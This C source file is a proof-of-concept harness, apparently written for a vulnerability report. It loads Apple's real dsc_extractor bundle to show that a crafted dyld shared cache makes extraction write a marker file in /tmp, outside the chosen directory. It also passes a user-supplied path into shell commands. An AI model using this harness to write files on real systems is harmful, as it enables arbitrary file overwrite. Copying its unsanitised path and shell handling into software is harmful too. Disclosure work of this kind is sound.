/*
 * dsc_real_poc.c — DSC-EXTRACTOR-TRAVERSAL-1 real-target PoC
 *
 * CWE-22 Path Traversal in Apple dyld SharedCacheDylibExtractor::extractCache()
 *
 * This program invokes the ACTUAL extraction function from the system's
 * dsc_extractor.bundle (or Xcode toolchain), NOT a reimplementation.
 * It demonstrates that dyld_shared_cache_extract_dylibs_progress() — which
 * internally calls SharedCacheDylibExtractor::extractCache() — writes a file
 * outside the designated extraction directory when the dyld cache contains
 * a crafted image path with ".." components.
 *
 * The vulnerable code path in dsc_extractor.cpp:
 *
 *   name = (char*)(cacheBase + image.pathFileOffset);  // attacker-controlled
 *   strcpy(dylib_path, extractionRootPath);
 *   strcat(dylib_path, name);                          // no ".." sanitization
 *   make_dirs(dylib_path);
 *   fd = open(dylib_path, O_CREAT|O_TRUNC|O_RDWR, 0644);
 *
 * Build (macOS only):
 *   cc -O2 -o dsc_real_poc dsc_real_poc.c
 *
 * Usage:
 *   ./dsc_real_poc <malicious_cache_path> <outdir>
 *
 * Confirms Gate A if TRAVERSAL_TARGET (/tmp/poc_dsc_traversal_proof) is
 * created outside <outdir>.
 *
 * Reporter: Yuval Fradkin — yuvalfradkin@gmail.com
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <Block.h>

/* Known locations of dsc_extractor.bundle on macOS + Xcode */
static const char *BUNDLE_CANDIDATES[] = {
    /* Xcode 15+ */
    "/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/dsc_extractor.bundle",
    /* Xcode 14 */
    "/Applications/Xcode.app/Contents/Developer/usr/lib/dsc_extractor.bundle",
    /* Command-line tools */
    "/Library/Developer/CommandLineTools/usr/lib/dsc_extractor.bundle",
    /* Older Xcode paths */
    "/Applications/Xcode.app/Contents/SharedFrameworks/LLDB.framework/Versions/A/Resources/dsc_extractor.bundle",
    /* System fallback (macOS 13+) */
    "/usr/lib/dsc_extractor.bundle",
    /* Xcode beta */
    "/Applications/Xcode-beta.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/dsc_extractor.bundle",
    NULL
};

/* Prototype for the exported symbol */
typedef int (*extract_fn_t)(
    const char *shared_cache_file_path,
    const char *extraction_root_path,
    void (^progress)(unsigned current, unsigned total)
);

static void *find_and_open_bundle(const char **out_path_used)
{
    for (int i = 0; BUNDLE_CANDIDATES[i] != NULL; i++) {
        struct stat st;
        if (stat(BUNDLE_CANDIDATES[i], &st) == 0) {
            printf("[*] Found bundle: %s\n", BUNDLE_CANDIDATES[i]);
            void *h = dlopen(BUNDLE_CANDIDATES[i], RTLD_NOW | RTLD_LOCAL);
            if (h) {
                if (out_path_used) *out_path_used = BUNDLE_CANDIDATES[i];
                return h;
            }
            printf("[!] dlopen failed for %s: %s\n", BUNDLE_CANDIDATES[i], dlerror());
        }
    }

    /* Also try xcrun to locate it dynamically */
    printf("[*] Trying xcrun to locate dsc_extractor.bundle...\n");
    FILE *fp = popen("xcrun -find dyld_shared_cache_util 2>/dev/null", "r");
    if (fp) {
        char util_path[1024] = {0};
        if (fgets(util_path, sizeof(util_path), fp)) {
            /* strip trailing newline */
            size_t l = strlen(util_path);
            if (l > 0 && util_path[l-1] == '\n') util_path[l-1] = '\0';
            /* bundle is typically in ../lib/dsc_extractor.bundle relative to the util */
            char *last_slash = strrchr(util_path, '/');
            if (last_slash) {
                *last_slash = '\0';
                char bundle_path[2048];
                snprintf(bundle_path, sizeof(bundle_path), "%s/../lib/dsc_extractor.bundle", util_path);
                printf("[*] Trying xcrun-derived path: %s\n", bundle_path);
                void *h = dlopen(bundle_path, RTLD_NOW | RTLD_LOCAL);
                if (h) {
                    pclose(fp);
                    static char static_bundle_path[2048];
                    strncpy(static_bundle_path, bundle_path, sizeof(static_bundle_path)-1);
                    if (out_path_used) *out_path_used = static_bundle_path;
                    return h;
                }
                printf("[!] dlopen failed: %s\n", dlerror());
            }
        }
        pclose(fp);
    }

    return NULL;
}

int main(int argc, char **argv)
{
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <malicious_cache> <outdir>\n", argv[0]);
        fprintf(stderr, "\n");
        fprintf(stderr, "Invokes dyld_shared_cache_extract_dylibs_progress() from the system\n");
        fprintf(stderr, "dsc_extractor.bundle to demonstrate CWE-22 path traversal.\n");
        return 1;
    }

    const char *cache_path = argv[1];
    const char *outdir     = argv[2];

    printf("==================================================\n");
    printf(" DSC-EXTRACTOR-TRAVERSAL-1 — real-target Gate A\n");
    printf("==================================================\n");
    printf("Cache:  %s\n", cache_path);
    printf("Outdir: %s\n", outdir);
    printf("\n");

    /* Verify cache exists */
    struct stat st;
    if (stat(cache_path, &st) != 0) {
        fprintf(stderr, "[!] Cache not found: %s (%s)\n", cache_path, strerror(errno));
        return 1;
    }
    printf("[+] Cache size: %lld bytes\n", (long long)st.st_size);

    /* Create output directory */
    if (mkdir(outdir, 0755) != 0 && errno != EEXIST) {
        fprintf(stderr, "[!] mkdir(%s): %s\n", outdir, strerror(errno));
        return 1;
    }

    /* Find and load the real dsc_extractor.bundle */
    printf("\n[*] Searching for dsc_extractor.bundle...\n");
    const char *bundle_path_used = NULL;
    void *bundle = find_and_open_bundle(&bundle_path_used);
    if (!bundle) {
        fprintf(stderr, "[!] Could not locate or load dsc_extractor.bundle.\n");
        fprintf(stderr, "    Candidates tried:\n");
        for (int i = 0; BUNDLE_CANDIDATES[i]; i++)
            fprintf(stderr, "      %s\n", BUNDLE_CANDIDATES[i]);
        fprintf(stderr, "    Ensure Xcode or Command Line Tools are installed.\n");
        return 1;
    }
    printf("[+] Loaded: %s\n", bundle_path_used ? bundle_path_used : "(unknown)");

    /* Resolve the extraction function */
    extract_fn_t extract_fn = (extract_fn_t)dlsym(bundle, "dyld_shared_cache_extract_dylibs_progress");
    if (!extract_fn) {
        /* Try the non-progress variant */
        extract_fn = (extract_fn_t)dlsym(bundle, "dyld_shared_cache_extract_dylibs");
        if (!extract_fn) {
            fprintf(stderr, "[!] dlsym: %s\n", dlerror());
            dlclose(bundle);
            return 1;
        }
        printf("[*] Using symbol: dyld_shared_cache_extract_dylibs (no progress)\n");
    } else {
        printf("[+] Resolved symbol: dyld_shared_cache_extract_dylibs_progress\n");
    }
    printf("\n");

    /* Confirm traversal target absent before extraction */
    const char *traversal_target = "/tmp/poc_dsc_traversal_proof";
    if (access(traversal_target, F_OK) == 0) {
        printf("[*] Removing pre-existing traversal target: %s\n", traversal_target);
        unlink(traversal_target);
    }
    printf("[*] Pre-extraction: %s does NOT exist (confirmed)\n", traversal_target);

    /* Call the REAL extraction function */
    printf("[*] Calling dyld_shared_cache_extract_dylibs_progress(\"%s\", \"%s\", ...)\n",
           cache_path, outdir);
    printf("    (internally calls SharedCacheDylibExtractor::extractCache())\n\n");

    __block unsigned last_pct = 999;
    int ret = extract_fn(cache_path, outdir, ^(unsigned current, unsigned total) {
        if (total > 0) {
            unsigned pct = (current * 100) / total;
            if (pct != last_pct) {
                printf("[*] Extraction progress: %u/%u (%u%%)\r", current, total, pct);
                fflush(stdout);
                last_pct = pct;
            }
        }
    });
    printf("\n");
    printf("[*] dyld_shared_cache_extract_dylibs_progress() returned: %d\n\n", ret);

    /* Check Gate A */
    printf("==================================================\n");
    printf(" Gate A verification\n");
    printf("==================================================\n");

    if (access(traversal_target, F_OK) == 0) {
        printf("\n[!] TRAVERSAL CONFIRMED (Gate A)\n");
        printf("    File written OUTSIDE extraction directory:\n");
        stat(traversal_target, &st);
        printf("    %s  (%lld bytes)\n", traversal_target, (long long)st.st_size);

        /* Show content */
        FILE *f = fopen(traversal_target, "r");
        if (f) {
            char buf[256] = {0};
            fread(buf, 1, sizeof(buf)-1, f);
            fclose(f);
            printf("    Content: %s", buf);
        }

        printf("\n    Extraction dir (should be empty or not contain the traversal file):\n");
        char ls_cmd[512];
        snprintf(ls_cmd, sizeof(ls_cmd), "ls -la '%s'/ 2>/dev/null | head -10", outdir);
        system(ls_cmd);

        dlclose(bundle);
        return 0;

    } else {
        printf("\n[~] Traversal target NOT found at %s\n", traversal_target);
        printf("    This may mean:\n");
        printf("      1. The extraction function rejected the malicious cache (format check)\n");
        printf("      2. The path traversal was sanitized in this version\n");
        printf("      3. The extraction outdir was too shallow (need deeper path)\n\n");

        printf("    Extraction dir contents:\n");
        char ls_cmd[512];
        snprintf(ls_cmd, sizeof(ls_cmd), "find '%s' -ls 2>/dev/null | head -20", outdir);
        system(ls_cmd);

        printf("\n    Return value was: %d\n", ret);
        printf("    (0 = success, non-zero = error)\n");

        dlclose(bundle);
        return 1;
    }
}
